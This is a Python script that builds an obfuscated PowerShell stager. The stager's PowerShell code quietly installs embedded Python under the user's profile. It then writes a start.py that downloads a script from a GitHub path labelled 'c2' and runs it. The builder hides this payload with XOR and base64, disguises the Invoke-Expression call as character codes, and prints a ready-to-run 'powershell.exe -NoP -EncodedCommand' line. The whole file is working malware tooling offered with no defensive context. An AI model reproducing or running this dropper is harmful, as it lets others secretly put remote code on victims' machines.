import base64

key = b'ATOM' 
text = """
$url = 'https://www.python.org/ftp/python/3.13.14/python-3.13.14-embed-amd64.zip'
$extractPath = Join-Path $env:USERPROFILE 'update'
$zipPath     = Join-Path $extractPath 'python.zip'
$pythonExe   = Join-Path $extractPath 'python.exe'
$startPy     = Join-Path $extractPath 'start.py'
New-Item -Path $extractPath -ItemType Directory -Force | Out-Null
if (-not (Test-Path -LiteralPath $pythonExe -PathType Leaf)) {
    try {Invoke-WebRequest -Uri $url -OutFile $zipPath -UseBasicParsing
        Expand-Archive -LiteralPath $zipPath -DestinationPath $extractPath -Force
        if (-not (Test-Path -LiteralPath $pythonExe -PathType Leaf)) {
            throw 'python.exe was not found after extraction.'}
        Remove-Item -LiteralPath $zipPath -Force} catch {exit 1}}
$PythonCode = @"
from urllib.request import urlopen
from pathlib import Path
import subprocess, sys
test_file = Path(__file__).parent / "update.py"
with urlopen("https://raw.githubusercontent.com/gaca9302/usb/refs/heads/main/c2/pycode.txt") as res:
    test_file.write_text(res.read().decode('utf-8'), encoding="utf-8")
subprocess.run([sys.executable, str(test_file)], check=True)
"@
Set-Content -Path $startPy -Value $PythonCode -Encoding UTF8
& "$env:USERPROFILE/update/python.exe" "$env:USERPROFILE/update/start.py"
"""

xor_bytes = bytes(b ^ key[i % len(key)] for i, b in enumerate(text.encode('utf-8')))
res = base64.b64encode(xor_bytes).decode()

bs_text = f"([Text.Encoding]::UTF8.GetString(([Convert]::FromBase64String('{res}')"
bs_text += "|%{ $_ -bxor [int][char]"+'"' + key.decode('utf-8') + '"'+"[$i++ % 4] })))|.(([char[]](73,69,88)-join''))"

bs_bytes = base64.b64encode(bs_text.encode('utf-16le')).decode('utf-8')
print("powershell.exe -NoP -EncodedCommand", bs_bytes)
